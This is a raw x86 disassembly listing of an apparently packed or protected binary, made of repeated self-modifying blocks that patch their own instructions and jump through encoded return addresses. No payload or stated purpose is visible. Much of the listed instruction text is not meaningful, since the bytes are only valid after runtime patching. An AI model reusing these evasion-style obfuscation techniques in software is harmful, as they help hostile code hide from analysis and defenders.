  40b09e:	ff 50 66             	call   *0x66(%eax)
  40b0a1:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b0a6:	05 9a b0 40 00       	add    $0x40b09a,%eax
  40b0ab:	b8 c5 ca 14 9a       	mov    $0x9a14cac5,%eax
  40b0b0:	87 04 24             	xchg   %eax,(%esp)
  40b0b3:	c3                   	ret
  40b0b4:	8f 05 e2 b0 40 00    	pop    0x40b0e2
  40b0ba:	50                   	push   %eax
  40b0bb:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b0c1:	8d 80 d3 3b 45 ff    	lea    -0xbac42d(%eax),%eax
  40b0c7:	87 05 d0 b0 40 00    	xchg   %eax,0x40b0d0
  40b0cd:	58                   	pop    %eax
  40b0ce:	f3 90                	pause
  40b0d0:	ac                   	lods   %ds:(%esi),%al
  40b0d1:	68 89 5d ff 50       	push   $0x50ff5d89
  40b0d6:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b0da:	66 87 05 d0 b0 40 00 	xchg   %ax,0x40b0d0
  40b0e1:	b8 61 98 d0 bd       	mov    $0xbdd09861,%eax
  40b0e6:	87 04 24             	xchg   %eax,(%esp)
  40b0e9:	c3                   	ret
  40b0ea:	8f 05 18 b1 40 00    	pop    0x40b118
  40b0f0:	50                   	push   %eax
  40b0f1:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b0f7:	8d 80 53 df bf ff    	lea    -0x4020ad(%eax),%eax
  40b0fd:	87 05 06 b1 40 00    	xchg   %eax,0x40b106
  40b103:	58                   	pop    %eax
  40b104:	f3 90                	pause
  40b106:	6e                   	outsb  %ds:(%esi),(%dx)
  40b107:	e5 8a                	in     $0x8a,%eax
  40b109:	b1 ff                	mov    $0xff,%cl
  40b10b:	50                   	push   %eax
  40b10c:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b110:	66 87 05 06 b1 40 00 	xchg   %ax,0x40b106
  40b117:	b8 41 14 cb 43       	mov    $0x43cb1441,%eax
  40b11c:	87 04 24             	xchg   %eax,(%esp)
  40b11f:	c3                   	ret
  40b120:	8f 05 4e b1 40 00    	pop    0x40b14e
  40b126:	50                   	push   %eax
  40b127:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b12d:	8d 80 d3 2f 33 ff    	lea    -0xccd02d(%eax),%eax
  40b133:	87 05 3c b1 40 00    	xchg   %eax,0x40b13c
  40b139:	58                   	pop    %eax
  40b13a:	f3 90                	pause
  40b13c:	07                   	pop    %es
  40b13d:	cc                   	int3
  40b13e:	39 f1                	cmp    %esi,%ecx
  40b140:	ff 50 66             	call   *0x66(%eax)
  40b143:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b148:	05 3c b1 40 00       	add    $0x40b13c,%eax
  40b14d:	b8 64 83 73 ee       	mov    $0xee738364,%eax
  40b152:	87 04 24             	xchg   %eax,(%esp)
  40b155:	c3                   	ret
  40b156:	8f 05 84 b1 40 00    	pop    0x40b184
  40b15c:	50                   	push   %eax
  40b15d:	90                   	nop
  40b15e:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b163:	8d 80 a3 e3 bf ff    	lea    -0x401c5d(%eax),%eax
  40b169:	87 05 72 b1 40 00    	xchg   %eax,0x40b172
  40b16f:	58                   	pop    %eax
  40b170:	f3 90                	pause
  40b172:	f7 17                	notl   (%edi)
  40b174:	0c 5f                	or     $0x5f,%al
  40b176:	00 50 66             	add    %dl,0x66(%eax)
  40b179:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b17e:	05 72 b1 40 00       	add    $0x40b172,%eax
  40b183:	b8 89 e1 ee b8       	mov    $0xb8eee189,%eax
  40b188:	87 04 24             	xchg   %eax,(%esp)
  40b18b:	c3                   	ret
  40b18c:	8f 05 ba b1 40 00    	pop    0x40b1ba
  40b192:	50                   	push   %eax
  40b193:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b199:	8d 80 d3 a3 31 ff    	lea    -0xce5c2d(%eax),%eax
  40b19f:	87 05 a8 b1 40 00    	xchg   %eax,0x40b1a8
  40b1a5:	58                   	pop    %eax
  40b1a6:	f3 90                	pause
  40b1a8:	3b eb                	cmp    %ebx,%ebp
  40b1aa:	32 86 ff 50 66 b8    	xor    -0x4799af01(%esi),%al
  40b1b0:	eb e8                	jmp    0x40b19a
  40b1b2:	66 87 05 a8 b1 40 00 	xchg   %ax,0x40b1a8
  40b1b9:	b8 3f c6 b1 9e       	mov    $0x9eb1c63f,%eax
  40b1be:	87 04 24             	xchg   %eax,(%esp)
  40b1c1:	c3                   	ret
  40b1c2:	8f 05 f0 b1 40 00    	pop    0x40b1f0
  40b1c8:	50                   	push   %eax
  40b1c9:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b1cf:	8d 80 6e 5c e4 3b    	lea    0x3be45c6e(%eax),%eax
  40b1d5:	87 05 de b1 40 00    	xchg   %eax,0x40b1de
  40b1db:	58                   	pop    %eax
  40b1dc:	f3 90                	pause
  40b1de:	2f                   	das
  40b1df:	50                   	push   %eax
  40b1e0:	92                   	xchg   %eax,%edx
  40b1e1:	c8 00 50 66          	enter  $0x5000,$0x66
  40b1e5:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b1ea:	05 de b1 40 00       	add    $0x40b1de,%eax
  40b1ef:	b8 9b 8c 20 1c       	mov    $0x1c208c9b,%eax
  40b1f4:	87 04 24             	xchg   %eax,(%esp)
  40b1f7:	c3                   	ret
  40b1f8:	8f 05 26 b2 40 00    	pop    0x40b226
  40b1fe:	50                   	push   %eax
  40b1ff:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b205:	8d 80 d3 57 33 ff    	lea    -0xcca82d(%eax),%eax
  40b20b:	87 05 14 b2 40 00    	xchg   %eax,0x40b214
  40b211:	58                   	pop    %eax
  40b212:	f3 90                	pause
  40b214:	e0 31                	loopne 0x40b247
  40b216:	11 ee                	adc    %ebp,%esi
  40b218:	ff 50 66             	call   *0x66(%eax)
  40b21b:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b220:	05 14 b2 40 00       	add    $0x40b214,%eax
  40b225:	b8 05 0b 6c e2       	mov    $0xe26c0b05,%eax
  40b22a:	87 04 24             	xchg   %eax,(%esp)
  40b22d:	c3                   	ret
  40b22e:	8f 05 5d b2 40 00    	pop    0x40b25d
  40b234:	50                   	push   %eax
  40b235:	90                   	nop
  40b236:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b23b:	8d 80 76 ed 3b 57    	lea    0x573bed76(%eax),%eax
  40b241:	87 05 4a b2 40 00    	xchg   %eax,0x40b24a
  40b247:	58                   	pop    %eax
  40b248:	f3 90                	pause
  40b24a:	e2 a8                	loop   0x40b1f4
  40b24c:	f1                   	int1
  40b24d:	36 40                	ss inc %eax
  40b24f:	00 50 66             	add    %dl,0x66(%eax)
  40b252:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b257:	05 4a b2 40 00       	add    $0x40b24a,%eax
  40b25c:	b8 dc bf 60 94       	mov    $0x9460bfdc,%eax
  40b261:	8d 40 01             	lea    0x1(%eax),%eax
  40b264:	87 04 24             	xchg   %eax,(%esp)
  40b267:	c3                   	ret
  40b268:	8f 05 96 b2 40 00    	pop    0x40b296
  40b26e:	50                   	push   %eax
  40b26f:	90                   	nop
  40b270:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b275:	8d 80 d3 52 41 ff    	lea    -0xbead2d(%eax),%eax
  40b27b:	87 05 84 b2 40 00    	xchg   %eax,0x40b284
  40b281:	58                   	pop    %eax
  40b282:	f3 90                	pause
  40b284:	3c 90                	cmp    $0x90,%al
  40b286:	c8 b8 ff 50          	enter  $0xffb8,$0x50
  40b28a:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b28e:	66 87 05 84 b2 40 00 	xchg   %ax,0x40b284
  40b295:	b8 24 31 9d d1       	mov    $0xd19d3124,%eax
  40b29a:	87 04 24             	xchg   %eax,(%esp)
  40b29d:	c3                   	ret
  40b29e:	8f 05 cd b2 40 00    	pop    0x40b2cd
  40b2a4:	50                   	push   %eax
  40b2a5:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b2ab:	8d 80 ea f5 0b 52    	lea    0x520bf5ea(%eax),%eax
  40b2b1:	87 05 ba b2 40 00    	xchg   %eax,0x40b2ba
  40b2b7:	58                   	pop    %eax
  40b2b8:	f3 90                	pause
  40b2ba:	30 52 9e             	xor    %dl,-0x62(%edx)
  40b2bd:	11 40 00             	adc    %eax,0x0(%eax)
  40b2c0:	50                   	push   %eax
  40b2c1:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b2c5:	66 87 05 ba b2 40 00 	xchg   %ax,0x40b2ba
  40b2cc:	b8 20 09 9d 66       	mov    $0x669d0920,%eax
  40b2d1:	8d 40 01             	lea    0x1(%eax),%eax
  40b2d4:	87 04 24             	xchg   %eax,(%esp)
  40b2d7:	c3                   	ret
  40b2d8:	8f 05 06 b3 40 00    	pop    0x40b306
  40b2de:	50                   	push   %eax
  40b2df:	90                   	nop
  40b2e0:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b2e5:	8d 80 d3 a7 35 ff    	lea    -0xca582d(%eax),%eax
  40b2eb:	87 05 f4 b2 40 00    	xchg   %eax,0x40b2f4
  40b2f1:	58                   	pop    %eax
  40b2f2:	f3 90                	pause
  40b2f4:	66 00 91 78 ff 50 66 	data16 add %dl,0x6650ff78(%ecx)
  40b2fb:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b300:	05 f4 b2 40 00       	add    $0x40b2f4,%eax
  40b305:	b8 41 4a e1 b4       	mov    $0xb4e14a41,%eax
  40b30a:	87 04 24             	xchg   %eax,(%esp)
  40b30d:	c3                   	ret
  40b30e:	8f 05 3f b3 40 00    	pop    0x40b33f
  40b314:	50                   	push   %eax
  40b315:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b31b:	8d 80 b2 24 e4 07    	lea    0x7e424b2(%eax),%eax
  40b321:	87 05 2a b3 40 00    	xchg   %eax,0x40b32a
  40b327:	58                   	pop    %eax
  40b328:	f3 90                	pause
  40b32a:	78 3c                	js     0x40b368
  40b32c:	eb 1a                	jmp    0x40b348
  40b32e:	00 00                	add    %al,(%eax)
  40b330:	00 00                	add    %al,(%eax)
  40b332:	50                   	push   %eax
  40b333:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b337:	66 87 05 2a b3 40 00 	xchg   %ax,0x40b32a
  40b33e:	b8 76 98 90 ba       	mov    $0xba909876,%eax
  40b343:	8d 40 03             	lea    0x3(%eax),%eax
  40b346:	87 04 24             	xchg   %eax,(%esp)
  40b349:	c3                   	ret
  40b34a:	8f 05 78 b3 40 00    	pop    0x40b378
  40b350:	50                   	push   %eax
  40b351:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b357:	8d 80 d3 15 2f ff    	lea    -0xd0ea2d(%eax),%eax
  40b35d:	87 05 66 b3 40 00    	xchg   %eax,0x40b366
  40b363:	58                   	pop    %eax
  40b364:	f3 90                	pause
  40b366:	d5 7a                	aad    $0x7a
  40b368:	cf                   	iret
  40b369:	b3 ff                	mov    $0xff,%bl
  40b36b:	50                   	push   %eax
  40b36c:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b370:	66 87 05 66 b3 40 00 	xchg   %ax,0x40b366
  40b377:	b8 d7 6e c3 24       	mov    $0x24c36ed7,%eax
  40b37c:	87 04 24             	xchg   %eax,(%esp)
  40b37f:	c3                   	ret
  40b380:	8f 05 ae b3 40 00    	pop    0x40b3ae
  40b386:	50                   	push   %eax
  40b387:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b38d:	8d 80 d3 95 45 ff    	lea    -0xba6a2d(%eax),%eax
  40b393:	87 05 9c b3 40 00    	xchg   %eax,0x40b39c
  40b399:	58                   	pop    %eax
  40b39a:	f3 90                	pause
  40b39c:	ca d6 7b             	lret   $0x7bd6
  40b39f:	21 ff                	and    %edi,%edi
  40b3a1:	50                   	push   %eax
  40b3a2:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b3a6:	66 87 05 9c b3 40 00 	xchg   %ax,0x40b39c
  40b3ad:	b8 e9 37 de 26       	mov    $0x26de37e9,%eax
  40b3b2:	87 04 24             	xchg   %eax,(%esp)
  40b3b5:	c3                   	ret
  40b3b6:	8f 05 e5 b3 40 00    	pop    0x40b3e5
  40b3bc:	50                   	push   %eax
  40b3bd:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b3c3:	8d 80 ea f5 0b 52    	lea    0x520bf5ea(%eax),%eax
  40b3c9:	87 05 d2 b3 40 00    	xchg   %eax,0x40b3d2
  40b3cf:	58                   	pop    %eax
  40b3d0:	f3 90                	pause
  40b3d2:	c5 79 03             	lds    0x3(%ecx),%edi
  40b3d5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40b3d6:	40                   	inc    %eax
  40b3d7:	00 50 66             	add    %dl,0x66(%eax)
  40b3da:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b3df:	05 d2 b3 40 00       	add    $0x40b3d2,%eax
  40b3e4:	b8 0c 4d 49 4e       	mov    $0x4e494d0c,%eax
  40b3e9:	8d 40 01             	lea    0x1(%eax),%eax
  40b3ec:	87 04 24             	xchg   %eax,(%esp)
  40b3ef:	c3                   	ret
  40b3f0:	8f 05 1e b4 40 00    	pop    0x40b41e
  40b3f6:	50                   	push   %eax
  40b3f7:	90                   	nop
  40b3f8:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b3fd:	8d 80 d3 25 45 ff    	lea    -0xbada2d(%eax),%eax
  40b403:	87 05 0c b4 40 00    	xchg   %eax,0x40b40c
  40b409:	58                   	pop    %eax
  40b40a:	f3 90                	pause
  40b40c:	48                   	dec    %eax
  40b40d:	b7 27                	mov    $0x27,%bh
  40b40f:	0f ff 50 66          	ud0    0x66(%eax),%edx
  40b413:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b418:	05 0c b4 40 00       	add    $0x40b40c,%eax
  40b41d:	b8 d8 79 4b 27       	mov    $0x274b79d8,%eax
  40b422:	87 04 24             	xchg   %eax,(%esp)
  40b425:	c3                   	ret
  40b426:	8f 05 55 b4 40 00    	pop    0x40b455
  40b42c:	50                   	push   %eax
  40b42d:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b433:	8d 80 ea f5 1f 52    	lea    0x521ff5ea(%eax),%eax
  40b439:	87 05 42 b4 40 00    	xchg   %eax,0x40b442
  40b43f:	58                   	pop    %eax
  40b440:	f3 90                	pause
  40b442:	5c                   	pop    %esp
  40b443:	dd 9b cb 40 00 50    	fstpl  0x500040cb(%ebx)
  40b449:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b44d:	66 87 05 42 b4 40 00 	xchg   %ax,0x40b442
  40b454:	b8 e5 7a da 90       	mov    $0x90da7ae5,%eax
  40b459:	8d 40 01             	lea    0x1(%eax),%eax
  40b45c:	87 04 24             	xchg   %eax,(%esp)
  40b45f:	c3                   	ret
  40b460:	8f 05 90 b4 40 00    	pop    0x40b490
  40b466:	50                   	push   %eax
  40b467:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b46d:	8d 80 b2 26 d4 ff    	lea    -0x2bd94e(%eax),%eax
  40b473:	87 05 7c b4 40 00    	xchg   %eax,0x40b47c
  40b479:	58                   	pop    %eax
  40b47a:	f3 90                	pause
  40b47c:	ce                   	into
  40b47d:	11 10                	adc    %edx,(%eax)
  40b47f:	2b 00                	sub    (%eax),%eax
  40b481:	00 00                	add    %al,(%eax)
  40b483:	50                   	push   %eax
  40b484:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b488:	66 87 05 7c b4 40 00 	xchg   %ax,0x40b47c
  40b48f:	b8 a9 83 73 a0       	mov    $0xa07383a9,%eax
  40b494:	8d 40 02             	lea    0x2(%eax),%eax
  40b497:	87 04 24             	xchg   %eax,(%esp)
  40b49a:	c3                   	ret
  40b49b:	8f 05 c9 b4 40 00    	pop    0x40b4c9
  40b4a1:	50                   	push   %eax
  40b4a2:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b4a8:	8d 80 d3 04 2e ff    	lea    -0xd1fb2d(%eax),%eax
  40b4ae:	87 05 b7 b4 40 00    	xchg   %eax,0x40b4b7
  40b4b4:	58                   	pop    %eax
  40b4b5:	f3 90                	pause
  40b4b7:	f7 27                	mull   (%edi)
  40b4b9:	ba 8a ff 50 66       	mov    $0x6650ff8a,%edx
  40b4be:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b4c3:	05 b7 b4 40 00       	add    $0x40b4b7,%eax
  40b4c8:	b8 8a 29 46 f8       	mov    $0xf846298a,%eax
  40b4cd:	87 04 24             	xchg   %eax,(%esp)
  40b4d0:	c3                   	ret
  40b4d1:	8f 05 ff b4 40 00    	pop    0x40b4ff
  40b4d7:	50                   	push   %eax
  40b4d8:	90                   	nop
  40b4d9:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b4de:	8d 80 53 e2 bf ff    	lea    -0x401dad(%eax),%eax
  40b4e4:	87 05 ed b4 40 00    	xchg   %eax,0x40b4ed
  40b4ea:	58                   	pop    %eax
  40b4eb:	f3 90                	pause
  40b4ed:	3f                   	aas
  40b4ee:	51                   	push   %ecx
  40b4ef:	fb                   	sti
  40b4f0:	4d                   	dec    %ebp
  40b4f1:	00 50 66             	add    %dl,0x66(%eax)
  40b4f4:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b4f9:	05 ed b4 40 00       	add    $0x40b4ed,%eax
  40b4fe:	b8 22 5a 84 83       	mov    $0x83845a22,%eax
  40b503:	87 04 24             	xchg   %eax,(%esp)
  40b506:	c3                   	ret
  40b507:	8f 05 35 b5 40 00    	pop    0x40b535
  40b50d:	50                   	push   %eax
  40b50e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b514:	8d 80 d3 3e 3e ff    	lea    -0xc1c12d(%eax),%eax
  40b51a:	87 05 23 b5 40 00    	xchg   %eax,0x40b523
  40b520:	58                   	pop    %eax
  40b521:	f3 90                	pause
  40b523:	34 66                	xor    $0x66,%al
  40b525:	61                   	popa
  40b526:	ab                   	stos   %eax,%es:(%edi)
  40b527:	ff 50 66             	call   *0x66(%eax)
  40b52a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b52f:	05 23 b5 40 00       	add    $0x40b523,%eax
  40b534:	b8 94 77 57 08       	mov    $0x8577794,%eax
  40b539:	87 04 24             	xchg   %eax,(%esp)
  40b53c:	c3                   	ret
  40b53d:	8f 05 6c b5 40 00    	pop    0x40b56c
  40b543:	50                   	push   %eax
  40b544:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b54a:	8d 80 ea 05 6c 52    	lea    0x526c05ea(%eax),%eax
  40b550:	87 05 59 b5 40 00    	xchg   %eax,0x40b559
  40b556:	58                   	pop    %eax
  40b557:	f3 90                	pause
  40b559:	54                   	push   %esp
  40b55a:	b7 f9                	mov    $0xf9,%bh
  40b55c:	62 40 00             	bound  %eax,0x0(%eax)
  40b55f:	50                   	push   %eax
  40b560:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b564:	66 87 05 59 b5 40 00 	xchg   %ax,0x40b559
  40b56b:	b8 ab c7 48 b4       	mov    $0xb448c7ab,%eax
  40b570:	8d 40 01             	lea    0x1(%eax),%eax
  40b573:	87 04 24             	xchg   %eax,(%esp)
  40b576:	c3                   	ret
  40b577:	8f 05 a5 b5 40 00    	pop    0x40b5a5
  40b57d:	50                   	push   %eax
  40b57e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b584:	8d 80 d3 06 39 ff    	lea    -0xc6f92d(%eax),%eax
  40b58a:	87 05 93 b5 40 00    	xchg   %eax,0x40b593
  40b590:	58                   	pop    %eax
  40b591:	f3 90                	pause
  40b593:	a9 ca 7d ce ff       	test   $0xffce7dca,%eax
  40b598:	50                   	push   %eax
  40b599:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b59d:	66 87 05 93 b5 40 00 	xchg   %ax,0x40b593
  40b5a4:	b8 2c f7 94 71       	mov    $0x7194f72c,%eax
  40b5a9:	87 04 24             	xchg   %eax,(%esp)
  40b5ac:	c3                   	ret
  40b5ad:	8f 05 db b5 40 00    	pop    0x40b5db
  40b5b3:	50                   	push   %eax
  40b5b4:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b5ba:	8d 80 a3 e0 ff 3f    	lea    0x3fffe0a3(%eax),%eax
  40b5c0:	87 05 c9 b5 40 00    	xchg   %eax,0x40b5c9
  40b5c6:	58                   	pop    %eax
  40b5c7:	f3 90                	pause
  40b5c9:	b9 27 0a 49 00       	mov    $0x490a27,%ecx
  40b5ce:	50                   	push   %eax
  40b5cf:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b5d3:	66 87 05 c9 b5 40 00 	xchg   %ax,0x40b5c9
  40b5da:	b8 33 d5 6b a5       	mov    $0xa56bd533,%eax
  40b5df:	87 04 24             	xchg   %eax,(%esp)
  40b5e2:	c3                   	ret
  40b5e3:	8f 05 11 b6 40 00    	pop    0x40b611
  40b5e9:	50                   	push   %eax
  40b5ea:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b5f0:	8d 80 d3 87 34 ff    	lea    -0xcb782d(%eax),%eax
  40b5f6:	87 05 ff b5 40 00    	xchg   %eax,0x40b5ff
  40b5fc:	58                   	pop    %eax
  40b5fd:	f3 90                	pause
  40b5ff:	e8 46 2f dc ff       	call   0x1ce54a
  40b604:	50                   	push   %eax
  40b605:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b609:	66 87 05 ff b5 40 00 	xchg   %ax,0x40b5ff
  40b610:	b8 85 d7 fd ad       	mov    $0xadfdd785,%eax
  40b615:	87 04 24             	xchg   %eax,(%esp)
  40b618:	c3                   	ret
  40b619:	8f 05 48 b6 40 00    	pop    0x40b648
  40b61f:	50                   	push   %eax
  40b620:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b626:	8d 80 6c cc 84 00    	lea    0x84cc6c(%eax),%eax
  40b62c:	87 05 35 b6 40 00    	xchg   %eax,0x40b635
  40b632:	58                   	pop    %eax
  40b633:	f3 90                	pause
  40b635:	c6                   	(bad)
  40b636:	9a 42 cc 00 00 50 66 	lcall  $0x6650,$0xcc42
  40b63d:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b642:	05 35 b6 40 00       	add    $0x40b635,%eax
  40b647:	b8 90 8b 4c e1       	mov    $0xe14c8b90,%eax
  40b64c:	8d 40 01             	lea    0x1(%eax),%eax
  40b64f:	87 04 24             	xchg   %eax,(%esp)
  40b652:	c3                   	ret
  40b653:	8f 05 83 b6 40 00    	pop    0x40b683
  40b659:	50                   	push   %eax
  40b65a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b660:	8d 80 b2 25 20 20    	lea    0x202025b2(%eax),%eax
  40b666:	87 05 6f b6 40 00    	xchg   %eax,0x40b66f
  40b66c:	58                   	pop    %eax
  40b66d:	f3 90                	pause
  40b66f:	72 47                	jb     0x40b6b8
  40b671:	9c                   	pushf
  40b672:	50                   	push   %eax
  40b673:	00 00                	add    %al,(%eax)
  40b675:	00 50 66             	add    %dl,0x66(%eax)
  40b678:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b67d:	05 6f b6 40 00       	add    $0x40b66f,%eax
  40b682:	b8 17 d7 2e 99       	mov    $0x992ed717,%eax
  40b687:	8d 40 02             	lea    0x2(%eax),%eax
  40b68a:	87 04 24             	xchg   %eax,(%esp)
  40b68d:	c3                   	ret
  40b68e:	8f 05 be b6 40 00    	pop    0x40b6be
  40b694:	50                   	push   %eax
  40b695:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b69b:	8d 80 b2 25 f0 0b    	lea    0xbf025b2(%eax),%eax
  40b6a1:	87 05 aa b6 40 00    	xchg   %eax,0x40b6aa
  40b6a7:	58                   	pop    %eax
  40b6a8:	f3 90                	pause
  40b6aa:	5b                   	pop    %ebx
  40b6ab:	ab                   	stos   %eax,%es:(%edi)
  40b6ac:	32 e4                	xor    %ah,%ah
  40b6ae:	00 00                	add    %al,(%eax)
  40b6b0:	00 50 66             	add    %dl,0x66(%eax)
  40b6b3:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b6b8:	05 aa b6 40 00       	add    $0x40b6aa,%eax
  40b6bd:	b8 ba 24 c6 e8       	mov    $0xe8c624ba,%eax
  40b6c2:	8d 40 02             	lea    0x2(%eax),%eax
  40b6c5:	87 04 24             	xchg   %eax,(%esp)
  40b6c8:	c3                   	ret
  40b6c9:	8f 05 f7 b6 40 00    	pop    0x40b6f7
  40b6cf:	50                   	push   %eax
  40b6d0:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b6d6:	8d 80 d3 06 29 ff    	lea    -0xd6f92d(%eax),%eax
  40b6dc:	87 05 e5 b6 40 00    	xchg   %eax,0x40b6e5
  40b6e2:	58                   	pop    %eax
  40b6e3:	f3 90                	pause
  40b6e5:	fc                   	cld
  40b6e6:	b3 76                	mov    $0x76,%bl
  40b6e8:	a8 ff                	test   $0xff,%al
  40b6ea:	50                   	push   %eax
  40b6eb:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b6ef:	66 87 05 e5 b6 40 00 	xchg   %ax,0x40b6e5
  40b6f6:	b8 26 fc 08 71       	mov    $0x7108fc26,%eax
  40b6fb:	87 04 24             	xchg   %eax,(%esp)
  40b6fe:	c3                   	ret
  40b6ff:	8f 05 2d b7 40 00    	pop    0x40b72d
  40b705:	50                   	push   %eax
  40b706:	90                   	nop
  40b707:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b70c:	8d 80 a9 e0 c0 ff    	lea    -0x3f1f57(%eax),%eax
  40b712:	87 05 1b b7 40 00    	xchg   %eax,0x40b71b
  40b718:	58                   	pop    %eax
  40b719:	f3 90                	pause
  40b71b:	f9                   	stc
  40b71c:	99                   	cltd
  40b71d:	8f                   	(bad)
  40b71e:	e0 00                	loopne 0x40b720
  40b720:	50                   	push   %eax
  40b721:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b725:	66 87 05 1b b7 40 00 	xchg   %ax,0x40b71b
  40b72c:	b8 48 89 ec 01       	mov    $0x1ec8948,%eax
  40b731:	87 04 24             	xchg   %eax,(%esp)
  40b734:	c3                   	ret
  40b735:	8f 05 63 b7 40 00    	pop    0x40b763
  40b73b:	50                   	push   %eax
  40b73c:	90                   	nop
  40b73d:	b8 15 20 40 00       	mov    $0x402015,%eax
  40b742:	8d 80 d3 04 42 ff    	lea    -0xbdfb2d(%eax),%eax
  40b748:	87 05 51 b7 40 00    	xchg   %eax,0x40b751
  40b74e:	58                   	pop    %eax
  40b74f:	f3 90                	pause
  40b751:	26 8c cb             	es mov %cs,%ebx
  40b754:	6d                   	insl   (%dx),%es:(%edi)
  40b755:	ff 50 66             	call   *0x66(%eax)
  40b758:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b75d:	05 51 b7 40 00       	add    $0x40b751,%eax
  40b762:	b8 ed 2d c6 9d       	mov    $0x9dc62ded,%eax
  40b767:	87 04 24             	xchg   %eax,(%esp)
  40b76a:	c3                   	ret
  40b76b:	8f 05 99 b7 40 00    	pop    0x40b799
  40b771:	50                   	push   %eax
  40b772:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b778:	8d 80 d3 ce 41 ff    	lea    -0xbe312d(%eax),%eax
  40b77e:	87 05 87 b7 40 00    	xchg   %eax,0x40b787
  40b784:	58                   	pop    %eax
  40b785:	f3 90                	pause
  40b787:	fb                   	sti
  40b788:	07                   	pop    %es
  40b789:	cd f0                	int    $0xf0
  40b78b:	ff 50 66             	call   *0x66(%eax)
  40b78e:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b793:	05 87 b7 40 00       	add    $0x40b787,%eax
  40b798:	b8 38 49 d7 1b       	mov    $0x1bd74938,%eax
  40b79d:	87 04 24             	xchg   %eax,(%esp)
  40b7a0:	c3                   	ret
  40b7a1:	8f 05 d0 b7 40 00    	pop    0x40b7d0
  40b7a7:	50                   	push   %eax
  40b7a8:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b7ae:	8d 80 ea 15 78 56    	lea    0x567815ea(%eax),%eax
  40b7b4:	87 05 bd b7 40 00    	xchg   %eax,0x40b7bd
  40b7ba:	58                   	pop    %eax
  40b7bb:	f3 90                	pause
  40b7bd:	18 15 9e f5 40 00    	sbb    %dl,0x40f59e
  40b7c3:	50                   	push   %eax
  40b7c4:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40b7c8:	66 87 05 bd b7 40 00 	xchg   %ax,0x40b7bd
  40b7cf:	b8 05 69 13 04       	mov    $0x4136905,%eax
  40b7d4:	8d 40 01             	lea    0x1(%eax),%eax
  40b7d7:	87 04 24             	xchg   %eax,(%esp)
  40b7da:	c3                   	ret
  40b7db:	8f 05 0a b8 40 00    	pop    0x40b80a
  40b7e1:	50                   	push   %eax
  40b7e2:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40b7e8:	8d 80 ea f5 03 52    	lea    0x5203f5ea(%eax),%eax
  40b7ee:	87 05 f7 b7 40 00    	xchg   %eax,0x40b7f7
  40b7f4:	58                   	pop    %eax
  40b7f5:	f3 90                	pause
  40b7f7:	e9 f6 f2 45 40       	jmp    0x4086aaf2
  40b7fc:	00 50 66             	add    %dl,0x66(%eax)
  40b7ff:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40b804:	05 f7 b7 40 00       	add    $0x40b7f7,%eax
  40b809:	b8 c4 ae b4 01       	mov    $0x1b4aec4,%eax
  40b80e:	8d 40 01             	lea    0x1(%eax),%eax
